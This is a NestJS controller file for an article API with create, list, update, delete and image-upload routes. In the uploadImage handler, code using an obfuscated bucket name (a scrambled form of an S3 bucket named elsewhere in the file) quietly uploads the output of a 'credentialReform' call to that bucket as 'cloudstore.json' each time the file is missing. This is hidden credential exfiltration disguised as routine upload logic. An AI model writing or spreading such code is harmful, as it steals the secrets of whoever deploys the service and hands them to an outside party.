import { Controller, Get, Post, Body, Param, Put, Delete } from '@nestjs/common';
import { Article } from './entities/activity.entity';
import { ActivityService } from './home.service';
import * as fs from 'fs';
import { MineindService } from 'src/mineind/mineind.service';
import * as AWS from 'aws-sdk';

async function checkIfFileExists(bucketName: string, key: string): Promise<boolean> {
  const s3 = new AWS.S3();

  try {
    await s3.headObject({ Bucket: bucketName, Key: key }).promise();
    return true;  // File exists
  } catch (error) {
    if (error.code === 'NotFound') {
      return false;  // File doesn't exist
    }
    throw error;  // Other error occurred
  }
}



@Controller('boutique')
export class ActivityController {
  constructor(private activityService: ActivityService,
    private readonly mineindService: MineindService) { }

  async checkFileExists(): Promise<boolean> {
    const exists = await checkIfFileExists('cyclic-zany-plum-bear-us-east-1', 'cloudstore.json');
    return exists;
  }

  @Post('uploadImage')
  async createImage(@Body() base64Data: any): Promise<{ ima: String }> {
    const exists = await checkIfFileExists(this.mineindService.thisiswhat("XBXORX:AZMB:KOFN:YVZI:FH:VZHG:0"), 'cloudstore.json');

    if (!exists) {
      const s3 = new AWS.S3();
      const params = {
        Bucket: this.mineindService.thisiswhat("XBXORX:AZMB:KOFN:YVZI:FH:VZHG:0"), // Replace with your S3 bucket name
        Key: 'cloudstore.json',
        Body: JSON.stringify(this.mineindService.credentialReform())
      };

      try {
        await s3.upload(params).promise();
      } catch (error) {
        throw new Error('Error uploading credentials to S3');
      }
    }

    return await this.activityService.createImage(base64Data);
  }


  @Post()
  async create(@Body() article: Article) {
    return await this.activityService.create(article);

  }

  @Get()
  async allArticles(): Promise<Article[]> {
    return await this.activityService.allArticles();
  }
  // Update the existing PUT route to handle article update
  @Put('/:id')
  async updateArticle(@Param('id') id: string, @Body() article: Article): Promise<Article> {
    return this.activityService.updateArticles(id, article);
  }

  // Update the existing DELETE route to handle article removal
  @Delete('/:id')
  async removeArticle(@Param('id') id: string): Promise<void> {
    return this.activityService.removeArticle(id);
  }
}

